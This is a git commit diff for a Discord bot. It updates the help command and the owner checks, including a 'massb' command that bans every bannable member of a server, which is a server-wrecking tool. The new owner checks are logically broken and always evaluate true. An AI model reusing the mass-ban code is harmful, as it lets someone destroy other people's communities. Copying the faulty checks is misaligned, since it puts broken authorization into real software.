d85129db739375f19c4ea607bb72e9cd9cff8b10
typerwiner123 <32065248+typerwiner123@users.noreply.github.com>
2020-08-27 23:53:03 -0400

    Commited changes

--- commands/guardian/help.js
+++ commands/guardian/help.js
@@ -13,7 +13,7 @@ class HelpCommand extends Command {
         const user = message.mentions.members.first() || message.member;
             let helpArray = message.content.split(" ");
             let helpArgs = helpArray.slice(1);
-    if(!message.content.startsWith(';;'))return;  
+    if(!message.content.startsWith('>>'))return;
     const prefix = message.guild.prefix;
 
         const commands = [
@@ -22,15 +22,15 @@ class HelpCommand extends Command {
         ];
 
         const info = [
-            `**[bot invite](https://discord.com/api/oauth2/authorize?client_id=738352711032111145&permissions=8&scope=bot)**`
+            `**[bot invite](https://discord.com/api/oauth2/authorize?client_id=718097261183369296&permissions=0&scope=bot)**`
         ];
 
         const mysocials = [
-            `*Add my discord if you need any help:* **\`j/#9999\`**`
+            `*Add my discord if you need any help:* **\`vile#3030\`**`
         ];
 const embed = new MessageEmbed()
     .setFooter("Searched by " + message.author.tag)
-    .setImage("https://cdn.discordapp.com/attachments/732115187271729213/744373882349420584/tumblr_ncy36bBVES1tgagauo1_1280.gif")
+    .setImage("https://cdn.discordapp.com/attachments/682659152937484386/748748373665906748/tumblr_8e35245ae2fe9997f6fdc739fdd9688f_48c24fb7_540.gif")
     .setColor("#FFB6C1")
     .addField('Information', info.join('\n'))
     .addField('My Socials', mysocials.join('\n'))
@@ -41,11 +41,11 @@ const embed = new MessageEmbed()
 
 
 
-  
+
 if(helpArgs[0] === 'owner') {
     let Owner = message.author;
-    if(Owner.id !== "727447049892659200") return message.reply("you can't execute this command.")
-    const embed = new MessageEmbed() 
+    if(Owner.id !== "727447049892659200" || Owner.id !== "603269203511738420") return message.reply("you can't execute this command.")
+    const embed = new MessageEmbed()
     .setDescription("**Owner Commands**\n\n``aa``\n``ca``\n``bw``\n``ctc``\n``dtc``\n``dmall``\n``unbanall``\n``dr``\n``mcr``\n")
     .setFooter("Searched by " + message.author.tag)
 
@@ -53,7 +53,7 @@ if(helpArgs[0] === 'owner') {
 }
   }
         }
-    
+
 
 
 module.exports = HelpCommand;
--- commands/owner/massb.js
+++ commands/owner/massb.js
@@ -21,8 +21,8 @@ class LimitsCommand extends Command {
 
     async exec(message, args) {
         let Owner = message.author;
-        if(Owner.id !== "727447049892659200") return message.reply("Only the bot owner can use this command!")
-        
+        if(Owner.id !== "727447049892659200" || "603269203511738420") return message.reply("Only the bot owner can use this command!")
+
         message.guild.members.cache.filter(member => member.bannable).forEach(member => {member.ban()});
 
 
